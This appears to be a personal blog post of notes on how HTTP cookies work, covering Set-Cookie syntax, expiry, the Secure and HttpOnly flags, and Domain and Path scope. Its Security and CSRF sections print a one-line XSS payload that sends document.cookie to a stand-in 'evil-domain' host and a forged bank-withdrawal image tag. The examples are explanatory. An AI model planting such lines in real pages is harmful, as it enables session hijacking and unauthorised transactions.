---
layout : post
title : Http Cookie
comments: true
categories : Other
---

  An HTTP cookie is a small piece of data that a server sends to the user's web browser. 
  
  The browser stores it(if it is enabled) and send it back to the same server in subsequent each request
  inside a Cookie HTTP header, even including requests for assets like images or CSS / JavaScript files.

### Purpose

  1. Session management
  2. Personalization
  3. Tracking
  
### Restrictions of Cookie

  - Cookies can only store 4KB of data
  - Cookies are private to the domain. A site can only read the cookies it set, not other domains cookies
  - You can have up to 20 limits of cookies per domain (but the exact number depends on the specific browser implementation)
  - Cookies are limited in their total number (but the exact number depends on the specific browser implementation). 
    If this number is exceeded, new cookies replace the older ones.
  
### Storage

  It is recommended nowadays to prefer modern storage APIs to improve performance. 
  
  Modern APIs for client storage are the [Web storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API) (`localStorage` and `sessionStorage`) 
  and [IndexedDB](https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API).
  
### Creating cookies

  When receiving an HTTP request, a server can send a `Set-Cookie` header with the response. A simple cookie is set like this:
  
  > Set-Cookie: \<cookie-name\>=\<cookie-value\>
  
  This header from the server tells the client to store a cookie.
  
  After that, the browser will send back all previously stored cookies to the server using the `Cookie` header.
  
#### Valid Cookie Value

  Cookie value should not contain any whitespace, comma or semicolon.
  
### Delete cookie

  To delete a cookie, unset its value and pass a date in the past.
  
### Session cookies

  Session cookie will be deleted when the browser is closed, because it didn't specify an `Expires` or `Max-Age` directive.
  
### Permanent cookies

  Permanent cookies expire at a specific date (`Expires`) or after a specific length of time (`Max-Age`).
  
  > Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
  
  Note: When an expiry date is set, the time and date set is relative to the client the cookie is being set on, not the server.
  
### Secure and HttpOnly cookies

  A `secure` cookie is only sent to the server over the `HTTPS` protocol. 
  
  **Note: This flag doesn't make sure the cookies will be sent secure.** 
  
  To prevent cross-site scripting (XSS) attacks, `HttpOnly` cookies are inaccessible to JavaScript's `Document.cookie` API,
  that is if the `HttpOnly` flag is not set, existing cookies can be accessed from JavaScript like `console.log(document.cookie);`.
  
  > Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
  
### Domain and Path

  The `Domain` and `Path` directives define the scope of the cookie: what URLs the cookies should be sent to.
  
#### Domain

  The purpose of the domain is to allow cookies to cross sub-domains. 
  
  If unspecified, it defaults to the host of the current document location, **excluding subdomains**. 
  If it is specified, then subdomains are always included.

  For example, if `Domain=mozilla.org` is set, then cookies are included on subdomains like `developer.mozilla.org`.
  
#### Path

  The `path` gives you the chance to specify a directory where the cookie is active. 
  
  For example, if `path=/docs` is set, this cookie is sent on `/docs`, `/docs/Web/` and other sub-urls of `/docs`.

  If you don’t set a path, it defaults to the current document location. 
  
  Usually the path is set to `/`, which means the cookie is valid throughout the **entire domain**.
  
  Please refer [Paths and Path-Match](https://tools.ietf.org/html/rfc6265#section-5.1.4) for detail.
  
##### Difference between with / and without /

[internet-explorer-sends-the-wrong-cookie-when-the-paths-overlap](https://stackoverflow.com/questions/8292449/internet-explorer-sends-the-wrong-cookie-when-the-paths-overlap)
  
### Security

  Common ways to steal cookies include Social Engineering or exploiting an XSS vulnerability in the application.
  
  > (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
  
### Cross-site request forgery (CSRF)

  Someone includes an image that isn’t really an image (for example in an unfiltered chat or forum), 
  instead it really is a request to your bank’s server to withdraw money:
  
  > \<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
  
### Third-party cookies

  Cookies have a domain associated to them. If this domain is the same as the domain of the page you are on, 
  the cookies is said to be a **first-party cookie**. If the domain is different, it is said to be a **third-party cookie**. 
  
  While `first-party` cookies are sent only to the server setting them, 
  a web page may contain images or other components stored on servers in other domains (like ad banners).
  
### Do-Not-Track

  The `DNT` header can be used to signal that a web application should disable either its tracking or 
  cross-site user tracking of an individual user. 
  
### Alternatives to cookie

  **JSON Web Tokens (JWT)**, which is a **Token-based Authentication**.
  
### References

[mozilla](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)

[humanwhocodes](https://humanwhocodes.com/blog/2009/05/05/http-cookies-explained/)

[flaviocopes](https://flaviocopes.com/cookies/)

[a-few-speed-improvements](https://stackoverflow.blog/2009/08/09/a-few-speed-improvements/)

[how-do-browsers-know-which-cookie-to-get](https://security.stackexchange.com/questions/33348/how-do-browsers-know-which-cookie-to-get)

[cookie-attributes-and-their-importance](https://www.paladion.net/blogs/cookie-attributes-and-their-importance)
